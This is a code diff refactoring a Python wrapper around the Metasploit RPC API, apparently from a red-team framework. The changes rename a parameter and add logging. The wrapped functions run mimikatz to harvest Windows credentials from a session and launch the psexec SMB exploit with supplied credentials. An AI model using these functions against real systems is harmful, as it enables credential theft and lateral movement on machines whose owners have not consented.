@@ -6,6 +6,7 @@
 
 import json
 
+from Core.lib import logger
 from Msgrpc.msgrpc import RpcClient, Method
 
 
@@ -16,9 +17,9 @@ class MsfModule(object):
         pass
 
     @staticmethod
-    def run_with_output(type, mname, opts, _timeout=180):
+    def run_with_output(module_type, mname, opts, _timeout=180):
         """实时运行,获取输出"""
-        params = [type,
+        params = [module_type,
                   mname,
                   opts,
                   False,
@@ -27,9 +28,9 @@ class MsfModule(object):
         return result
 
     @staticmethod
-    def run_as_job(type, mname, opts, ):
+    def run_as_job(module_type, mname, opts, ):
         """后台任务方式运行"""
-        params = [type,
+        params = [module_type,
                   mname,
                   opts,
                   True,
@@ -60,13 +61,14 @@ class MsfModuleAsFunction(object):
 
     @staticmethod
     def get_windows_password(sessionid):
-        type = "post"
+        module_type = "post"
         mname = "windows/gather/credentials/mimikatz"
         opts = {'SESSION': sessionid}
-        output = MsfModule.run_with_output(type, mname, opts)
+        output = MsfModule.run_with_output(module_type, mname, opts)
         try:
             result = json.loads(output)
         except Exception as E:
+            logger.exception(E)
             result = {'status': False}
         credential_list = []
         if result.get('status') is True:
@@ -83,9 +85,9 @@ class MsfModuleAsFunction(object):
     @staticmethod
     def psexec_exploit(rhosts, smbdomain, smbuser, smbpass, handler):
         """handler为字典类型"""
-        type = "exploit"
+        module_type = "exploit"
         mname = "windows/smb/psexec"
         opts = {'RHOSTS': rhosts, 'SMBDomain': smbdomain, 'SMBUser': smbuser, 'SMBPass': smbpass}
         opts = MsfModuleAsFunction._set_payload_by_handler(opts, handler)
-        output = MsfModule.run_as_job(type, mname, opts)
+        output = MsfModule.run_as_job(module_type, mname, opts)
         return output
